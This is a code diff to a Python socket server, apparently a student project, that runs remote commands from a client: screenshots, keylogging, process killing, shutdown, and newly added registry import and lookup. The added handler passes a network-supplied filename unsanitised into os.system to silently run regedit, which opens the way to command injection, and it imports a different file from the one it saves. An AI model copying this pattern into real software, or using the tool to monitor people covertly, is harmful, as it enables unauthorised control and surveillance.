@@ -6,6 +6,8 @@ from ScreenShot import*
 from RunningProccess import*
 from KeyLogger import*
 from ShutDown import*
+from Registry import*
+
 HEADER = 64
 PORT = 5050
 #SERVER = socket.gethostbyname(socket.gethostname())
@@ -21,6 +23,12 @@ KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
 KEY_LOGGING ="KEY LOG"
 SHUTDOWN = "SHUTDOWN"
 CANCEL_SHUTDOWN = "CANCEL SHUTDOWN"
+SEND_FILE = "SEND FILE"
+SEND_REG_FILE = "SEND REG FILE"
+CREATE_REG_KEY = "CREATE REG KEY"
+GET_KEY_VALUE = "GET KEY VALUE"
+
+
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
@@ -30,6 +38,25 @@ def conn_send(conn,send_this):
     conn.send(send_this.encode(FORMAT))
 def conn_recv(conn):
     return conn.recv(1024).decode(FORMAT)
+
+def conn_recv_reg_file(conn):
+    filename = conn.recv(1024).decode(FORMAT)
+    if filename != "NO FILE SENT!": 
+        with open(filename + "_from_client.reg","w") as file:
+            content_length = conn.recv(HEADER).decode(FORMAT)
+            if content_length:
+                content_length = int(content_length)
+                content = conn.recv(content_length).decode(FORMAT)
+            file.write(content)
+        os.system("regedit /s " + filename)
+        return True
+    return False
+            
+
+
+
+
+
 
 def handle_client(conn, addr):
     print(f"[NEW CONNECTION] {addr} connected.")
@@ -44,7 +71,7 @@ def handle_client(conn, addr):
 
 
             if msg == TAKE_SCREEN_SHOT:
-                Take_Screenshot("ScreenShot.png")
+                Take_Screenshot(os.getcwd() + "\\ScreenShot.png")
                 reply +="SREENSHOT TAKEN."
 
 
@@ -99,9 +126,30 @@ def handle_client(conn, addr):
                 cancel_shutdown()
                 reply += "SHUTDOWN CANCELED"
 
+
+            elif msg == SEND_REG_FILE:
+                if conn_recv_reg_file(conn):
+                    reply += "FILE RECEIVED"
+                else:
+                    reply += "NO FILE RECEIVED"
+
+            elif msg == GET_KEY_VALUE:
+                path = conn.recv(1024).decode(FORMAT)
+                name = conn.recv(1024).decode(FORMAT)
+                res = get_registry_value(path,name)
+                if res == "Invalid path!":
+                    reply = res
+                else :
+                    reply += path+ "   "+name+"    "+res
+
+
+
             elif msg == DISCONNECT_MESSAGE:
                 reply +="CONNECTION TERMINATED!"
                 connected = False
+            
+            
+
             else:
                 reply += "MESSAGE RECEIVED."
             time.sleep(0.500)
@@ -124,3 +172,5 @@ def start():
     
 print("[STARTING] server is starting ...")
 start()
+
+# C:\Users\MSI-NK\OneDrive\Máy tính\Code\DoAnSocket
